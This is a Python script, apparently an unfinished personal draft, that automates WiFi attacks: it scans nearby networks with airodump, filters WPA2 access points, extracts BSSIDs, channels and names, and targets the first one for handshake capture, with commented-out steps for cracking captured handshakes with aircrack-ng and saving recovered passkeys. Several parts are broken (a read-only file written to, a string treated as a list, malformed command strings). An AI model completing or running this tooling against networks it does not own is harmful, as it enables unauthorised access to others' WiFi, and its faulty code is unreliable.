import sys
import re
import os

os.popen('/bin/bash/monitormode')
os.popen('touch Desktop/wifis_found.txt')
os.popen('touch Desktop/Scans/handshake_captured')
os.popen('touch Desktop/Scans/failed')
save_file = open('Desktop/wifis_found.txt')

for line in os.popen('airodump wlan0 & pid=$! \n(sleep 10 && kill -HUP $pid) 2>/dev/null & watcher=$1 \nwait $pid 2>/dev/null && pkill -HUP -P $watcher'):
       save_file.writelines(line)
save_file.close()

os.popen('cat Desktop/wifis_found.txt | grep WPA2 | sort | uniq > Desktop/wifi_uniq.txt')

ch = 10
name = 15



test_file = '/Users/Jamie/Desktop/challenges/wifi.txt'

char_count = []
wifis = []
mac_addresses = []
x = 0
essid = 'has not worked'
wpa = ''

open_file = open(test_file)
contents = open_file.readlines()
for line in contents:
    if 'WPA2' in line:
            wifis.insert(x, line[1:])
            x += 1
    elif 'WPA' in line:
        wpa.insert(x, line[1:])

open_file.close()

#essid = wifis[0].split(' ', 1)[0]


for i in range(len(wifis)):
    mac_addresses.insert(i, wifis[i].partition('  ')[0])

for i, c in enumerate(wifis):
    char_count.append(c)

all_info = [[[] for i in range(16)] for i in range(len(wifis))]

for i in range(len(wifis)):
    all_info[i] = re.sub("[^\w]", " ", wifis[i]).split()

wordlist = re.sub("[^\w]", " ", wifis[0]).split()


for i in range(len(mac_addresses)):
    print(mac_addresses[i] + '  ch ' + all_info[i][ch] + '  ' + all_info[i][name])

os.popen('airodump wlan0 -c ' + (all_info[0][ch]) + '-w Desktop/Scans/Scan_' + (all_info[0][name]) + ' --bssid ' + mac_addresses[0] + ' wlan0')

# save_captured = open('Desktop/Scans/handshake_captured)
# save_failed = open('Desktop/Scans/failed)

# for i in range (len(mac_addresses)):
       #os.popen('airodump wlan0 -c ' + (all_info[i][ch]) + '-w Desktop/Scans/Scan_' + (all_info[i][name]) + ' --bssid ' + mac_addresses[i] + ' wlan0')
        # if 'handshake':
            # save_captured.writelines(line)

        # else:
            # save_failed.writelines(line)

# save_captured.close()
# save_failed.close()

# os.popen('aircrack-ng -w - Scan_' + (all_info[0][name]) + '-01.cap -e ' + (all_info[0][name]))
    # if 'passkey not found':
        # next

    # else:
        # add passkey to txtfile with associated mac address and essid


